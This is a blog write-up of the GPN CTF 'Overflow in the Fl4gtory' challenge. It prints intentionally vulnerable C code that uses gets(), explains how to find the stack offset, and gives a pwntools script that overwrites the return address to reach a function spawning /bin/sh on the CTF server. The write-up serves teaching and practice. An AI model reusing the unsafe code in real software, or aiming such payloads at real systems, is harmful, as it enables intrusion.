---
title: "GPN-CTF: Overflow in the Fl4gtory" 
date: 2023-06-10 23:32:18 +0300
categories: ["pwn", "buffer overflows"]
tags: ["easy",'ctf' , "kitctf", "gpn-ctf", "intro-to-pwn"]
author: calvin-kimani
---

# Background:

As an aspiring pwn enthusiast, I recently participated in the just concluded GPN CTF where I encountered some amazing but frustrating pwn challenges. 

Despite my best efforts, I was only able to solve a couple of pwn challenges during the CTF, but I remained determined to continue learning and improving my skills. 

This writeup focuses on the "Overflow in the Fl4gtory" challenge and "Overflows keep flowing", two of the pwn challenges I only managed to successfully exploit.

# Overflow in the Fl4gtory
## Challenge Description:

The "Overflow in the Fl4gtory" challenge presents a vulnerable program with a simple buffer overflow vulnerability. The objective is to exploit this vulnerability to gain control over the program and execute the shutoff() function, which will grant access to the flag.

![program exploited](/assets/ctf/pwn/2023/KitCTF/overflow-in-the-fl4gtory/overflow-in-the-fl4gtory-desc.png)


### Vulnerable Code:
```c
#include <stdio.h>
#include <stdlib.h>

// gcc -no-pie -fno-stack-protector -o overflow-in-the-fl4gtory overflow-in-the-fl4gtory.c

void shutoff() {
	printf("Pipe shut off!\n");
	printf("Congrats! You've solved (or exploited) the overflow! Get your flag:\n");
	execve("/bin/sh", NULL, NULL);
}


int main() {
	char buf[0xff];
	gets(buf);
	puts(buf);
	return 0;
}
```

## Vulnerable code explanation
The program is simple enough. In the main() function, a buffer named buf with a size of 255 bytes (0xff in hexadecimal) is declared. The user is prompted/required to enter input by the use of `gets` **(man gets)** which is stored in buf and the written input displayed to the screen by use of `puts(buf)` **(man puts)**

Taking a closer look at the provided source code, we can observe the absence of proper input validation. The vulnerable program, utilizes the gets() function to accept user input, but it lacks proper bounds checking. This flaw allows an attacker to overflow the buffer, which in our case is `buf`, potentially altering the program's stack and controlling its execution flow.

## Exploitation

To exploit this vulnerability, we need to determine the offset required to reach the return address on the stack. When a function is called during program execution, the called function's arguments are pushed on the stack in the reverse order of how they're declared, then the caller saves the next instruction to be executed after the called function by pushing it's address on the stack. This is so that the program will know where to return to after the called function finishes executing. 

This is what is called the **return address** `ret` and is the one we want to control by overflowing `buf`. 

After the return address is saved, the current stack pointer `sp` is saved to the base-pointer `ebp` which we can now use to reference the arguments and data stored on the stack since it is "stationary". Then we reserve memory on the stack for local data and functions by subtracting a the required number of bytes from `sp` which moves it to a new location to the top of the stack. We subtract because the stack moves from high memory addresses to low memory addresses.

We can see all this by disassembling the compiled code using **objdump** :
```bash
objdump -d overflow-in-the-fl4gtory
```

![objdump](/assets/ctf/pwn/2023/KitCTF/overflow-in-the-fl4gtory/objdump.png)

### calculating the offset

By analyzing the output from objdump, we can see that 256 bytes **(0x100 in decimal)** are being reserved on the stack. The `buf` array is 255 bytes **(0xff)** but since it is a `char` array the last byte is a null which shows the end of the string. We need to fill `buf` with 256 bytes and then overflow the base pointer `$rbp` which is 8 bytes.

Now we know our return address is 264 bytes(256+8) from the vulnerable buffer, so we craft a payload consisting of 264 bytes of padding followed by the address of the shutoff() function. 

In this case, we use the pwn library in Python to assist in building the payload and interacting with the target program.

```python
from pwn import *

context.terminal = ["alacritty", "-e"] # Substitute your terminal

## Locate the address of shutdown
elf = ELF("./overflow-in-the-fl4gtory")
shutoff_addr = elf.symbols["shutoff"]

## Create Payload
payload = b"A"*264+p64(shutoff_addr)

target = remote('overflow-in-the-fl4gtory-0.chals.kitctf.de', 1337, ssl=True)
target.sendline(payload)

## Profit $$
target.recv()
target.interactive()

```

### reading the flag

After constructing the payload, we establish a connection to the target server using the provided IP address and port. We then send the payload to the program. Upon successful exploitation, the shutoff() function will be executed, and we can read the flag.

![program exploited](/assets/ctf/pwn/2023/KitCTF/overflow-in-the-fl4gtory/overflow-in-the-fl4gtory.png)

By leveraging the buffer overflow vulnerability in the "Overflow in the Fl4gtory" challenge, we successfully gained control over the program's execution flow and executed the shutoff() function to obtain the flag.


>Writeup for "Overlows keep flowing" coming soon..
{: .prompt-tip }